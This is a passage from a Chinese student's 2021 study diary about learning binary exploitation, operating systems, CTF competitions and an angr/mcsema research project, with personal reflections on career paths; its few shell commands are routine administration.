<p>快要期末考了，最近有点不知道想干啥…想复习（预习？）但是提不起劲，要学pwn但是总觉得该复习了，另外，为啥期末的时候倒是来了几个ctf比赛orzzz<br>
这两天又看了一点点iot的东西，可能是因为又被堆漏洞折磨了。不过不论是系统（固件）or软件，漏洞总归是堆、栈、（池）之类那么几种（不知道在其他cpu架构下有没有别的，或者是受限于冯诺依曼机），不如先从常规的二进制安全入手学习。<br>
这两周写了几个stack的pwn题，胡乱看了一点malloc源码，可以再接触一点pwn-heap题了。</p>
<h3 id="2021-01-19">2021-01-19</h3>
<p>放假两周了。<br>
回家后复习了x86汇编实模式的后三章，又看完保护模式的前四章。<br>
感觉x86讲的东西挺好的，但有时候好绕？<br>
看目录觉得后面讲的基本都有接触过一些，这周就先转去看操作系统了，毕竟放假看x86的目的就是学操作系统，而《操作系统精髓与设计原理》 这本似乎就只是在讲概念，也没有涉及到代码，问题应该不大。看了四天，看到第三章</p>
<p>因为昨天报了几个ctf<br>
今天的话，复习了一下堆的一些基础知识。<br>
学习上又开始没动力了…</p>
<p>最近要练科三了（3号考），学习的时间再次减少。拿了本经济学原理（微观），希望能在去练车场的路上看看…<br>
不知道啥时候能开始坚持写日报，希望至少在考完科三后开始。</p>
<h3 id="2021-02-26">2021-02-26</h3>
<p>懂了，这是月记。今天返校了。这个寒假拿了个驾照，在市区&amp;县城开了几趟，以及开了一趟高速；看了五六章x86汇编，然后跳到《操作系统精髓与设计原理》懂了一点内核、进程 线程、分页 分段、虚拟内存的概念，并由于知识量大 尝试每看三章就对每章做一次总结；看了一章《0day2》，进度到了堆漏洞的章节，然后再看了其他的资料了解ptmalloc分配和释放内存的步骤。党哥前几天说回学校之后要给我个考核，这两天复习了一点汇编和PE文件结构。每次回家感觉都会产生一些别的想法（？）。</p>
<p>已删</p>
<h3 id="2021-03-01">2021-03-01</h3>
<p>其实党哥根本没有准备给我考核…<br>
开学的第一天，复习了一下堆分配和释放的过程，整理了一波笔记<br>
上了个微机原理和数据库，感觉算是对目前安全的学习都有直接用处，特别是微机原理，把8086和其他cpu的汇编语言和硬件结合，应该能更好的加强理解，数据库的话， sql语法主要是对于web安全了。<br>
感觉有点酸web安全，hw实习的工资好高…<br>
今天的话，还看了个经济学人的文章，做了笔记，结果wps国际版要vip才能保存…附加到od里，结果直接 pdf的窗口直接结束运行了…于是下了个foxin</p>
<h3 id="2021-03-03">2021-03-03</h3>
<p>主要看完了0day2的堆漏洞章节，还看了ctf-wiki上的堆溢出和off by one，感觉后者的题很难理解…<br>
这两天发现新版Edge看pdf变得很舒服了，再看了一篇经济学人的文章。</p>
<h3 id="2021-03-06">2021-03-06</h3>
<p>在知乎上发现@ScUpax0s师傅原来也是大二的，学的进度可能将近比我快了一年，还是看雪的版主…跟党哥进了同一家公司（星阑）实习。本来还打算追随党哥也投个星阑远程（划水），结果发现自己可能过于菜…<br>
但还是在党哥的监督下写了个简短的简历，发现自己大一的时候啥都不想争取，没有奖学金也没有奖项，简历真是太空了orz。投了一家成都做CTF培训之类的的真·小公司，不知道会咋样orz。<br>
关于@ScUpax0s师傅这个，看了他的博客，发现我现在学的 差不多是他去年五月份在做的…但讲真论学习的速度应该是差不多的，所以又在想是不是我在学pwn的时候走了啥弯路。（写到这个的时候想起来去年看了TK的某条关于走弯路的微博，心态又好了些）<br>
但回想起来感觉自己的学习路线还是出现了一点弯弯，就 不算是特别直接的向着漏洞挖掘方向学习</p>
<h3 id="2021-03-07">2021-03-07</h3>
<p>看了两天的off-by-one题(b00k)，想起来看别人题解看不懂的时候可以跟着一段段模仿exp抑或是用纸和笔画内存数据的变化情况，然后边调试边弄懂每段代码的功能和效果以及怎么想出的wp。本来这种做法在学栈方面的漏洞时经常用到，特别是上回弄栈迁移的时候，可能是才刚开始做堆漏洞的题吧…浪费了半天的时间死磕别人的题解和exp。<br>
b00k剩下最后一点没有看完，感觉这种题放在初学还是有点难度…做了一个hitcon_lab13，感觉对接受数据（recv()之类）的过程，以及啥时候要转换（u64、u32）还是不是很明白<br>
晚上在实验室看了部《美国丽人》</p>
<h3 id="2021-03-08">2021-03-08</h3>
<p>补了两天的日报（↑），更早之前的记不清了orzz<br>
今天用linux写exp的时候，因为有时候习惯按ctrl+z，虚拟机直接卡爆，一ps看 有几十个python脚本运行着…上网查了一下结束同名进程的方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -ef | grep &#x27;python&#x27; | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br></pre></td></tr></table></figure>
<p>感觉shell语法挺值得学的，打算啥时候开始学一学（咕咕咕）<br>
晚上隔壁实验室珂学长的服务器2080ti被黑去挖矿，于是跟着web安全的两个人过去瞅了瞅，还让大三实习的学长连了向日葵操作一波。还好用过linux，能看懂他们在干啥…收获了个应急响应的github教程，感觉好有趣（orz</p>
<h3 id="2021-03-09">2021-03-09</h3>
<p>写了一个heapcreator_wp。<br>
晚上遇到0x2l师傅，打算近期开始跟着mit6.828做操作系统，然后好好学计组。<br>
跟021w师傅和WalkerRev师傅聊了几句，他们又要面试了. TQL呜呜呜</p>
<h3 id="2021-03-11">2021-03-11</h3>
<p>这几天其实好像都没干啥…在磕fastbin_attack，有时候感觉略微迷茫<br>
晚上看了021w师傅投的腾讯游戏安全部门的“技术面”，结果一开始面试官聊天的时候发现其实方向不太对orz，师傅搞内核漏洞的，结果部门是偏向逆向、开发和游戏漏洞，所以面试就变成近半个小时的聊天…其中面试官也讲了好多，感觉确实windows内核漏洞这个方向太窄了，对于我这种菜鸡来说也不是特别promising（虽然我对内核漏洞好像也不是特别感兴趣<br>
感觉漏洞的方向其实挺多，需要的知识也挺杂的，例如游戏安全需要分析、构造数据包…<br>
那位面试官也说了逆向技能和正向开发能力的重要性，以及最终职业和兴趣的关系，果然不是大牛的话就只能为生活所迫了</p>
<h3 id="2021-03-13">2021-03-13</h3>
<p>昨天啥都没干，写作业去了，<br>
周六（今天）放了个假，晚上补了11号的日报（↑）<br>
最近主要是学习计组，可能是因为对方向上的学习顺序不是很清楚吧orzz<br>
现在有：1.操作系统（理论）2.操作系统（mit6.828） 3.pwn-heap 4.0day2 5.c++ 6.iot（比如arm汇编啥的）要学</p>
<p>明天该上班了，问问0x2l师傅</p>
<h3 id="2021-03-14">2021-03-14</h3>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315101624.png" alt="20210315101624"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315101325.png" alt="20210315101325"></p>
<p>大概有个学习顺序了<br>
今天又是肝作业的一天</p>
<h3 id="2021-03-16">2021-03-16</h3>
<p>总算搞懂了lctf2016-pwn200，写了个wp，体会大概是要多用gdb 2333:)</p>
<h3 id="2021-03-17">2021-03-17</h3>
<p>没学安全，看了个计组和操作系统精髓</p>
<h3 id="2021-03-22">2021-03-22</h3>
<p>最近算是给自己放了个假…这几天只学了个HOF，看了点操作系统（并发）和十几页shell编程<br>
搞懂了HITCON training Lab11，一个用HOF和Unlink的题，exp不写了，<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FhYTE1ODkzODMxNzE2L2FydGljbGUvZGV0YWlscy8xMDI0MDgxNjc=">这个就挺好的<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="2021-03-25">2021-03-25</h3>
<p>昨天晚上开了一题bcloud，也是属于HOF的。早上满课，下午想了一会儿，晚上因为开会啥的事情搁置了，打算明天晚上结束掉。<br>
话说最近去打网球花了好多时间…</p>
<p>这几天心态不是很好，导致静不下心学习。复盘一下大概有以下原因：</p>
<ul>
<li>比起同一届的ScUpax0s师傅来说学习进度差了大概半年，而原因可以算是因为大一的时候不是在directly的学pwn，虽然记得TK教主说的关于学习走弯路的某条微博，但心理上还是略微接受不能…（说句题外的，上回在boss上认识了位成信大三叶草的前辈，冒出了“如果当时报了成信大，现在会咋样”的想法orzz）</li>
<li>看了大部分师傅的路线，不确定windows内核或浏览器漏洞挖掘之类的是否是自己想做的，似乎更想搞搞iot和智能硬件</li>
<li>如果将来想回厦门工作，就意味着不太可能去企业搞安全研究，那么厦门体制内是否需要二进制安全的人员，也许学个渗透测试啥的更好？</li>
<li>因为不是为了就业，所以好像应该在本科阶段拓宽知识面，而不是专注于研究一个方面（如仅限二进制漏洞挖掘）</li>
<li>由前几条引出的，啥时候开始、如何搞iot，即从x86、x64向web和arm、mips过渡</li>
</ul>
<h3 id="2021-03-26">2021-03-26</h3>
<p>看到了bcloud的两种解法，于是又慢慢摸鱼，弄到了第二天早上五点</p>
<h3 id="2021-03-27">2021-03-27</h3>
<p>早上睡到十点，回宿舍ob，下午复习了之前看的操作系统，做了点笔记</p>
<h3 id="2021-03-28">2021-03-28</h3>
<p>睡到十一点<br>
中午瞅了瞅Sakura师傅的日记，看了看大佬学习的历程，虽然依旧比较迷茫，不知道自己的roadmap应该怎么发展，但心情好了一些…<br>
找到了个南大的计算机系统基础实验，打算花一两周做一做<br>
晚上搭了个实验环境，对debian、vim、git的使用有了一定了解（尤其是git，打算靠这个实验掌握一下git的用法）<br>
没有想到debian和ubuntu还是有一点差别的，踩了点坑<br>
也试着用xshell连了一下本地的虚拟机，感觉挺爽2333</p>
<h3 id="2021-03-29">2021-03-29</h3>
<p>做完了PA1的第一阶段<br>
感觉还是有点难度，走了捷径看了前人在github上留下的项目<br>
今天本来要去找班主任聊聊（博士时在交大搞软件安全），hope他是有啥项目或者比赛能让我蹭蹭，可惜他去交大开会 临时鸽了，过几天再找他<br>
打算明天整一题pwn</p>
<h3 id="2021-03-30">2021-03-30</h3>
<p>做了个 2014 <span class="exturl" data-url="aHR0cDovL2hhY2subHU=">hack.lu<i class="fa fa-external-link-alt"></i></span> 的oreo</p>
<h3 id="2021-03-31">2021-03-31</h3>
<p>把昨天做的题整理了一下，为啥自己每次做题都只有一半思路，太菜了…<br>
下午心情不是很light，回宿舍看电影去了</p>
<h3 id="2021-04-01">2021-04-01</h3>
<p>愚人节快乐23333<br>
下雨鞋湿了一天，bad mood<br>
找了趟本来上周要去找的班主任，了解了一下他打算开展的课题，大概是一个静态自动化挖洞的玩意儿，（which算是拓宽了我的视野，原来实际中挖洞不止动态的fuzz…还是了解太少了)<br>
从老师那收到了两篇英文论文和一个github的项目<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpZnRpbmctYml0cy9tY3NlbWE=">mcsema<i class="fa fa-external-link-alt"></i></span><br>
晚上新建了个虚拟机搭了一半mcsema，（一半：因为网速太慢，晚上挂着下载），跟junz和老爸讨论了一下咋看论文，然后看了一页半回宿舍睡觉<br>
学到了个替换所有文件中字符串的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sed -i &quot;s/https:\/\/github/http:\/\/github/g&quot; `grep &quot;https://github&quot; -rl --include=*`</span><br></pre></td></tr></table></figure>
<h3 id="2021-04-02">2021-04-02</h3>
<p>看论文+装mcsema<br>
不知道为啥我的ubuntu20 tar命令好像不太对劲？2.2G的压缩文件解压出来用ls -lh看只有4k…and文件内容确实有些不对…因为在本机里解压完拖到虚拟机里build就能把mcsema装上orzz<br>
看非自然死亡看到半夜两点</p>
<h3 id="2021-04-03">2021-04-03</h3>
<p>清明节第一天，早上在睡觉，下午看四集非自然死亡<br>
晚上继续看论文和装remill（mcsema的一个依赖）。<br>
到现在mcsema和Anvill、remill应该已经装了四五次了（指删掉git和build的文件重新来过）发现前两个都能装上，remill出了点问题应该是因为依赖比较多，在mcsema项目里的build脚本里没有完全装上，而且脚本里是先安装remill的，所以可能有些abort没有注意到orz</p>
<p>半夜终于都弄好，仔细想想其实没多少坑，就按照guidance一步步来，提到的依赖全装上，有报错的话根据abort的位置判断是啥出了问题。比如有个“sorry, unimplemented: non-trivial designated initializers not supported”大概猜到是没有用clang编译，把clang设为默认就行了</p>
<h3 id="2021-04-08">2021-04-08</h3>
<p>好久没记日报了…<br>
这几天其实都在整mcsema这个工具…遇到的困难归根结底是没有可用的ida for linux（话说用盗版的ida写论文真的大丈夫？23333），于是乎想了①在win10虚拟机上搭建（后来发现官方文档好久没更新，提供的Windows下的搭建方法已经不适用了orz）②ida on wine，结果试了好几个版本，能找到的只有一个ida7.2（with python2.7），找的几个ida7.5不知道为啥在wine里打不开。<br>
随后发现不知道怎么样让mcsema_disass使用wine里的ida。今天在github里的issue里找到了个issue，里面有一段好像可以执行（which）的命令，但是跑了几次发现执行的时候好像死循环了（不知道是不是ida版本的问题），在github上@了他<br>
虽然最近没有学pwn，但还是从mcsema这个工具里了解了一些编译相关的知识和诸如环境搭建、解决依赖、cmake语句、linux指定c/c++编译器/python版本之类的东西，更不用说每天受到英文社区环境的熏陶，感觉阅读英文都顺很多，快赶上去年考完雅思的水平了23333<br>
五号早上参加了个老师的小组例会（还迟到了十分钟…）。其实也没干啥，就听了一下研究生前辈们的汇报，涨了点见识</p>
<h3 id="2021-04-12">2021-04-12</h3>
<p>这几天试了试安装dyninst和用别的方法生成cfg以及重装了wine（太折磨了），但不知道为啥sapck安装dyninst的时候报错了，感觉这个原因要决解的话还要花挺久的；认真看了一下mcsema生成的cfg好像和我理解的程序的cfg不太一样orz，关于这个打算明天问问老师<br>
昨天（还是前天）总算能跑mcsema了（ida on wine），但是disass官方样例得出的cfg和官方提供的结果不太一样（但也没有报错）…，晚上在github上@作者，对于这个提了个问题。<br>
话说这几天算是我提过最多commitment的一段时间了orz<br>
能跑起mcsema，虽然disass的时候会报错（但是lift可以用），但明天也能勉强交差了吧23333，不然一周进度没啥变化也太离谱了<br>
前几天跟老妈打电话的时候提到了ida for linux 的问题，然后十几分钟后她就发了个3k的红包，说是他俩让我拿去买ida的。太感动了qwq，不过还是没拿。<br>
晚上看了点漏洞战争。感觉最近两周都在搞课题的事情，二进制方向的学习拉了。整了个工具整这么久（比之前想学arm的时候搭qemu久多了），讲真挺令人头大的，于是周末啥都不想学，看了一部日剧放松。还是得调整好课题和安全学习。<br>
打算看完漏洞战争就开始路由器0day，渐渐转到iot/智能硬件上。不过立的好多flag在执行的时候都“中途易辙”了哎…<br>
最近对以后究竟是进厂还是体制内又有了别的想法，emmm有空再写吧</p>
<h3 id="2021-04-18">2021-04-18</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucGlhbnNoZW4uY29tL2FydGljbGUvNDkxNjM3MjIwNy8=">https://www.pianshen.com/article/4916372207/<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIwNDgwNjExL2FydGljbGUvZGV0YWlscy82ODQ4NTg1MQ==">https://blog.csdn.net/qq_20480611/article/details/68485851<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3JlYWQvY3Y4OTc1MTEw">https://www.bilibili.com/read/cv8975110<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="2021-04-19">2021-04-19</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/cc cc /usr/bin/clang-3.5 100</span><br><span class="line">sudo update-alternatives --install /usr/bin/c++ c++ /usr/bin/clang++-3.5 100</span><br></pre></td></tr></table></figure>
<h3 id="2021-04-24">2021-04-24</h3>
<p>（30号补的）<br>
早上参加了个英语竞赛，前天晚上做了个听力，看了看样卷的题型，感觉题量和难度还好（除了作文第二篇是真没看懂题目。）结果在考的时候发现题量还蛮大的…没写完，不过觉得要是熟悉写作的话应该还是可以写完的（BTW，作文题型和雅思有点像）<br>
考完当天就去找Jessie问了问雅思写作看啥书，然后买了<br>
中午看了个电影，晚上在实验室干啥倒是忘了</p>
<h3 id="2021-04-25">2021-04-25</h3>
<p>下午实验课刷手机，在iot_sec群里认识了个米厂搞iot安全的重邮师傅，聊了一点iot的学习、漏洞方向。对iot清晰了很多<br>
晚上复现了个CVE-2011-0104，然后和隔壁实验室的在bugku上试了一下awd，虽然[摸不着头脑]，不过感觉蛮有意思的，和常规的ctf差距也是比较大，更接近实战（吧）</p>
<h3 id="2021-04-27-2021-04-30">2021-04-27~2021-04-30</h3>
<p>没记错的话，26号应该是ob了<br>
27~29在学vex ir的语法</p>
<p>27号找田老师做了个汇报说了一下angr和retdec，然后他把项目要做的流程比较详细的说了一下（我才知道原来输入的是基本块而不是整个程序），我应该就负责generate出机器学习的数据。<br>
感觉我应该没有让他觉得太菜以至于不想带…以及他挺nice的：<br>
最近刚好在弄“互联网+”，他把我名字和他的研一学生一起报上去了</p>
<p>最近几天被邀报了几个ctf，但完全没想好啥时候再开始练pwn</p>
<p>&lt;以下和学习无关&gt;</p>
<p>30号。中午睡了个午觉到三点半，逛知乎、deploy博客到四点多，四点半准备从宿舍出来，五点二十分上车（此时已经慌了）结局是虽然的士司机开的挺快，但还是差了大概五分钟，上楼梯的时候看着火车从我面前开走Orz<br>
于是花了一个多小时退票（西安站是真的阴间），差不多双倍的价格（加上路费、晚餐）买了张机票，现在在机场出发层想着火车上的软卧想哭呜呜呜（<br>
回顾一下觉得，还是没有想周全（同时经验不够），以为和平时一样最多一个半小时就能到火车站，没有考虑到周五+五一，路上可能比较堵；也没有大概计划一下，总觉得车的时间挺晚的，4~5点出门应该都行，最终出门还是因为看了一下手机和导航，发现时间好像差不多了。<br>
怎么说呢，还好这回只是旅游吧emmm，以后应该不会再出这种问题<br>
晚上没舍得在sleep box住，找了个椅子躺一躺<br>
啊，我的软卧qwq</p>
<h3 id="2021-05-08">2021-05-08</h3>
<p>早上没课睡到12点，感觉应该是昨天中午打球累的orz<br>
晚上整了两题网络空间安全技术赛的pwn，算是作为复习吧（剩两题明天写），话说那些题是真的拉…<br>
之后应该也不会像上学期那样磕ctf-wiki，弄pwn可能就靠赛题了吧<br>
早上看了个NU1l二队纳新的宣传文，略艳羡但是知道自己路可能真的没法加上这个（课题+互联网+ +实习+考研）。又想到了ScUpax0s师傅，我咋就是个fw呢…</p>
<h3 id="2021-05-09">2021-05-09</h3>
<p>早上本来想分析个书上的漏洞，突然想到有个津门杯好像在今天，查了一下还真是…登上去发现队友把简单题打的差不多了，试了一下杂项的流量分析，网上查到了（一开始）类似的题，得到一串数字，提交发现不是flag，再想了一会儿放弃去看漏洞战争了<br>
下午做了个昨天剩下的pwn<br>
中间穿插一些时间整cve-2010-3333的漏洞软件，但下了七八个软件，一直没找到需要的版本，漏洞一直触发不了，想先放一边了2333<br>
最近一直没啥学习的状态</p>
<h3 id="2021-05-11">2021-05-11</h3>
<p>下午去找老师，被布置了个下周二在组会上讲vex ir的任务<br>
完全没有心情学习，ob了</p>
<h3 id="2021-05-13">2021-05-13</h3>
<p>把cve-2021-3333复现分析了</p>
<h3 id="2021-05-15">2021-05-15</h3>
<p><em>（16号记的）</em><br>
跟网安院的几位师傅打ciscn初赛<br>
话说要不是前天他们在群里聊了打完吃啥，我完全不知道今天有个比赛orz<br>
抛开前几天的两三题，有至少一个半月没做pwn了，感觉开学那时候水平差不多的师傅这回做的比我好多了（果然赛棍就是不一样，整天做题打比赛提升好快）。我个fw啥都不会，一天做了半个pwn，为re做了一点小小的贡献<br>
进了分区赛，这段时间得多做题了orz</p>
<h3 id="2021-05-16">2021-05-16</h3>
<p>后天早上要去汇报了，今天ppt还没做出来orz…</p>
<h3 id="2021-05-17">2021-05-17</h3>
<p>组会取消了:)<br>
ppt做了一半，就先不做了<br>
打算开始再学pwn，准备ciscn区域赛<br>
晚上互联网+那边学长说太忙了，让我做个视频。九点半去找他了解了一下要求，装了个pr</p>
<h3 id="2021-05-18">2021-05-18</h3>
<p>（学）做视频，下午六点半交给学长，一遍通过<br>
晚上复习了一下magisk和edxposed的安装（为了体育课刷步数orz）、学了一点tcache</p>
<h3 id="2021-05-19">2021-05-19</h3>
<p>找了题18年网鼎杯GUESS来做<br>
下午有个1x届的学长问有没有想打省级hvv的，被 1天3k 和 能在简历上加上hvv经历 吸引，稍微了解了一下</p>
<h3 id="2021-05-20">2021-05-20</h3>
<p>做完GUESS<br>
一做完就发现师大安全实验室把我们实验室名字也加到宣讲的宣传上去了…看来是得讲点啥了。<br>
决定宣讲的时候演示永恒之黑，晚上稍微实现了演示过程，算是头一回利用RW漏洞攻击，还真蛮有意思的</p>
<h3 id="2021-05-21">2021-05-21</h3>
<p>学长那边的hvv找不到人带我们，取消了<br>
啥都没干</p>
<h3 id="2021-05-22">2021-05-22</h3>
<p>去师大逛了一圈</p>
<h3 id="2021-05-25">2021-05-25</h3>
<p>区域赛出时间了</p>
<h3 id="2021-05-27">2021-05-27</h3>
<p>做了个18-wdb-blind，学习了一下io_file利用<br>
越做题越觉得自己弱<br>
把21号至今的日报补了一点，忘了自己都做了啥，感觉最近效率一般啊orz</p>
<h3 id="2021-05-04">2021-05-04</h3>
<p>到兰州准备区域赛</p>
<h3 id="2021-05-02">2021-05-02</h3>
<p>第一次打线下赛。除了一开始断网断电外，ylb居然没出啥大问题，题目质量也挺高的👏<br>
水了一个pwn、misc、crypto<br>
队伍区域赛第三、第五。<br>
XDnb</p>
<h3 id="2021-06-12">2021-06-12</h3>
<p>上周基本上在准备六级，结果今天身份证没带不让考orz<br>
这回要考估计也就550+，本来准备控分400，下回考个600+。这下连控分都不用了，（摊手）<br>
今天好像有个强网杯，没报，看学弟他们打<br>
得准备干点自己的事情了<br>
前段时间用qq转发一条链接的时候触发了一个bug。今天又试了一下，发现这个bug还挺稳定的，用windbg看了一下，估计是个栈上的？有机会复习一下如何回溯出触发漏洞的点</p>
<p>准备开始翻译一篇 iot sec 的survey</p>
<h3 id="2021-06-17">2021-06-17</h3>
<p>这几天把那篇综述翻译完了，感觉配合 DeepL 和 Google Translate 难度直接降下来了（👉对于一些长难句），一些没接触过的专业词汇查一下了解后也能够翻译出来。主要是语文水平限制了我的发挥（👉不知道正常人的语序和啥时候用逗号）。<br>
感觉翻译（/读论文）的过程对视野提升还是蛮大的<br>
虽然是19年底的论文，但是iot安全的发展是真的快，文中提到的一些安全问题已经改进了，也产生了新的成果和趋势，但依旧不失为搞懂iot安全领域方向的入门综述<br>
今天突然发现是一篇THU信安实验室的论文，<s>虽然不知道MDPI是个啥水平</s>。Orz，膜<br>
由于安全客有稿费（看雪好像只有雪币和临时号转正，Freebuf的话不知道收不收翻译），稍微再看了两遍翻译的结果，修改一下就在安全客提交了<br>
希望能通过23333<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210617212847.png" alt="20210617212847"></p>
<h3 id="2021-06-20">2021-06-20</h3>
<p>这几天感觉事太多但不知道干啥好…<br>
下周就课设&amp;考试了<br>
就先把GitHub里star了的一个教程看完吧orz<br>
顺便更新了一下kali2019<br>
看了个make\cmake的区别<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620211559.png" alt="20210620211559"></p>
<h3 id="2021-06-26">2021-06-26</h3>
<p>在bugku上打了个awd排位赛，纯用来熟悉awd。MobaXterm真好用</p>
<h3 id="2021-06-30">2021-06-30</h3>
<p>从20号到今天（其实是昨天）都在弄IoT固件分析入门（和复习），边做边整理，今天把整理出的东西发到安全客上了。（该想想接下来学啥了）</p>
<p>上回发的翻译今天也发表出来了，又看了一下，发现是诸葛建伟老师参与的论文，膜啊Orzz</p>
<p>今天院考都考完了，剩下下周的马原和英语，又可以浪几天2333</p>
<p>CISCN决赛还是一点消息都芜…</p>
<h3 id="2021-07-03">2021-07-03</h3>
<p>bugku打了个awd…因为队里只有我一个人，所以完全把web放掉，第一轮的时候就down了2333</p>
<p>试了打全场自动提交的脚本，没有完全达到预期功能</p>
<h3 id="2021-07-08">2021-07-08</h3>
<p>这两天弄了下CISCN build环节的题。提交的时候弄了好久，以为导出的docker镜像出了啥问题导致在服务器上连不上，结果发现是主办方的服务器只能测试web题 Orzzzz</p>
<p>最近周围的人都在搞期末考，咱考的比较早，然后就算是给自己放了几天假（指摸鱼看电影去了</p>
<p>过几天想唠嗑一下</p>
<h3 id="2021-07-19">2021-07-19</h3>
<p>17、18打了两天CISCN2021 in HRB，今年决赛还是蛮好的（指并没有像知乎上评价的去年的国赛那么离谱），既严控了py也没有大事故。比赛结果比较拉跨就是了orz。</p>
<p>第一天awd+可信。算是头一回打正经的awd（除了bugku的排位赛），放了几个题都不会，硬是拿流量重放。全场最后一小时前（给一小时前的流量）有得分的两题重放了一题，另一题和http相关，思路一直不对就没重放成功（其实直接向靶机requests.get就行了，还是见识太少）。可信计算…到机场坐阳间航班前放出赛程的时候才知道有这模块。群文件里的可信例题用到的Cube一直没装成功。比赛的时候队友一直以为要用Cube，就没有去看题。但其实感觉好像不用orz…赛后看了讲解，听说可以面向git做题（直接代码抄完）还蛮离谱的，（毕竟分值占比很大。<br>
第二天早上break+fix。师傅们出的题太难了orz，不会修也不会打。<br>
虽然被干得很惨，不过的确收获了很多东西，不论是没见过的题型还是没见过的师傅2333<br>
比赛见到了方滨兴院士（录像）和诸葛建伟老师（真人&amp;好几次），可惜比赛结果不咋地，后来上知乎看到有人和诸葛老师合影才想起来我错过了啥（悲</p>
<p>17号把信息给了安全客，坐等打款2333，今天向安全客运营提了几个建议，然后被拉入翻译核心群（笑<br>
18号hw晚宴抽奖，抽了个三等奖（次非洲人），拿了个摄像头2333</p>
<p>今天在哈尔滨逛，蛮热的。这里烧烤和大米是真的好吃，吐槽一下太平机场，也太小了吧，并且过安检的时候查完雨伞还不帮忙收起来的…</p>
<h3 id="2021-07-22">2021-07-22</h3>
<p>打完比赛在学校留了两天摸鱼，今天回厦门。早上起来发现昨天洗的毯子没干，于是行李箱加了个5kg+的毛毯…东航333的公务舱还蛮舒服的23333（候机室还是不如厦门机场的厦航候机室，机上吃的还行，但为啥餐具没有勺子）<br>
中午出门忘记喝感冒药，在候机室睡了四十分钟，起来头略晕。现在在飞机上，我是有啥毛病不睡觉搁这码字<br>
这几天其实啥都不想干，本来打算问一下科恩的师傅、课题导师和计算所刘博关于ctf和就业、考研的问题，由于不想动脑所以也没问，回家后一定好吧</p>
<p>（以下想到啥写啥，可能前言不搭后语<br>
最近了解了一下安恒的hws，有点想朝着这个方向整一整，但又不知道会不会和考研复习有些冲突。之前想着打完国赛就退役{半年ctf选手（笑 }，但现在着实觉得国赛优胜奖有点拉跨…而且看到师傅（赛棍）们的获奖经历，不知道我仅有的几个奖在考研复试能不能拿得出手…</p>
<ul>
<li>关于对两年来安全学习的一些复盘和反思：<br>
（打下上一行字的时候才意识到，已经入门两年了啊…好快<br>
先从个人说起吧。算是看过了几本书，但在这个学期之前都只是自己搞自己的，没有过多接触其他师傅，也没有找人组队参加比赛来鞭策自己，所以学习效率其实不是特别高，偶尔出现摸鱼一周做个两三题的情况（虽然有时候靠时长弥补了一点），做题时的思考其实也不太足够（指涉及到堆的），有些题只是能根据exp进行分析，离自己独立利用vul写出exp还有点距离，导致过一段时间再看又不会了（悲。大二上期中科恩的许前辈说的加入联合战队的建议也没有去做（主要是想着估计就打个一学期，而且当时认识的师傅不多，找到的都是贼顶的队伍，对能力不是很有信心）。之前的学习路线其实较为接近021w师傅（物理距离上也靠近2333）（因此点歪了pwn手技能树？），本来打算看完ctfwiki中pwn部分的内容、能做中等难度的pwn题后就开始分析RW的漏洞，结果大二下和网安院的几个师傅组队打国赛，漏洞战争看了几章就又搁置了。大二上本来想转IoT固件方向，期间跟许师傅交流了一下，因为一周没弄好QEMU等环境外加师傅建议先学好“基础方法论”就把这方面学习挂起了，过几天和lxonz师傅请教一下。大二下加入了班主任（导师）的课题组，就把大部分时间花在这上面，比如配置了半个月mcsema然后发现没有ida for linux 根本用不了2333，然后发现了RetDec，最终选择用angr…以及了解中间代码、学习VEX IR 并在组内做了个很捞的介绍（算是初试了科研的坑？）。其实现在依旧不是很清楚网安和和计算机在研究生时有啥交叉，（因为导师是计算机的，但课题又是基于代码相似性检测的漏洞挖掘…），还有ctf（除了RW）和实战、科研的关系，过两天问问。感觉我不是特别敢获得、把握资源，联系的美亚柏科暑期实习因为时间问题估计这个假期去不了、四叶草那边就没咋想去，前段时间看到ScUpax0s师傅联系了信工所六室的导师，签了合同暑假去那搞科研（我咋每见一次ScUpax0s师傅就羡慕一次（不过也学到了不少。大三了快要，不知道还有没有时间联系校外的老师&amp;做课题，如果按照上回珂学长说的，不知道考研前能不能出一篇，那估计得再找个老师蹭项目了？<br>
关于学校（外部环境）的评价。我校的安全是真的垃（题外话：某神拿了学校学生管理系统的权限能看到全校的成绩等信息），不止一次设想过如果当初报了成信大会咋样orz。首先很难理解为啥我协安全组和网安院特长班在upper层面是近乎没有交集的…明明可以相互吸收人员or交流以及组队比赛或举办校赛，（其实不太懂特长班是干啥的，这段时间每次去他们那都没几个人…）。其次似乎也没有专门负责/能够指导CTF的老师（整了个战队，过一两年就没人了），比赛的指导老师大多是学生自己填的，老师们也都是为了拿个指导奖，这次A去，下次B去，问题都不大。学校安全方面最多应该还是搞科研的密码学老师2333，（不过学校实验室好像也没有几个负责老师经常/偶尔/有过进行指导，emmmm），而且网安院的老师对CTF好像不是很支持？连个校赛都不想搞orzz。还有的话应该就是历届CTFer的传帮带氛围不足了。因为各种原因，大部分学长都想着直接就业（所以内推资源很够？2333），但对于双非&amp;ctf弱校来说大部分人直接面向就业学习显然是比当赛棍拿一堆奖去大厂的可能性高（当然也由于个体没有接触到联合战队之类的），所以基本上大三后就较少打ctf，直接去实习；而一进实验室给的（面向offer）学习路线也限制了大一新生快速上手CTF（如二进制看完王爽后的加密与解密+逆向工程核心原理），所以打ctf只能到大二和同年级/零星高年级师傅组队，同时也缺少高年级向低年级、同年级进行技术分享（本懒比没有组织，要检讨）；由于缺少历届学长积累各种资源，包括和其他学校的交流、工具等，导致每次都得重新自己造轮子，例如awd前最后